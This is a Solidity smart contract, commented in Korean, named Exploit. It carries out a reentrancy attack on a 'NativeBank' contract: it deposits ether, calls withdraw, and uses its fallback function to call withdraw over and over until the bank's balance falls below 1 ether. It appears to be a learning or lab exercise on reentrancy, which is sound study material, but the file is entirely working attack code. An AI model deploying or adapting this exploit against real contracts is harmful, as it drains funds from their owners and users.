// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

// NativeBank를 쓰기 위한 인터페이스
interface INativeBank {
    function withdraw() external;
}

contract Exploit {
    // NativeBank 주소
    INativeBank nb;

    constructor(INativeBank _nb) {
        nb = _nb;
    }

    //
    fallback() external payable {
        if (address(nb).balance >= 1 * 10 ** 18) {
            nb.withdraw();
        }
    }

    // Native Token을 함수를 통해 보낼 때 payable 키워드
    function exploit() external payable {
        // NativeBank의 receive 함수 실행하여 본인의 잔고 늘리기
        // NativeBank의 receive는 단지 잔고 늘리는 함수
        // EVM이 자동으로 차감
        (bool success, ) = address(nb).call{value: msg.value}("");
        require(success, "failed to staking");
        // 바로 인출
        // 바로 0을 만들지 않아 fallback을 호출하여 NativeBank의 잔액이 1미만이 될때까지 반복
        nb.withdraw();
    }
}
